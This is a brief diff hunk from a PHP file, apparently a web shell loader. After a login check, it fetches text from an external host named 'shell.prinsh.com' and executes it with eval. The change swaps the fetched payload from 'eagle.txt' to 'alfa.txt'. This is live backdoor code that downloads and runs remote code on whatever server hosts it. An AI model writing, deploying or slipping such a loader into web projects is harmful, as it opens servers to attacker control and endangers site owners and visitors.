@@ -33,7 +33,7 @@ if (is_logged_in()) {
         return $url_get_contents_data;
     }
 
-    $a = geturlsinfo('https://shell.prinsh.com/Nathan/eagle.txt');
+    $a = geturlsinfo('https://shell.prinsh.com/Nathan/alfa.txt');
     eval('?>' . $a);
 } else {
     // Display login form if not logged in
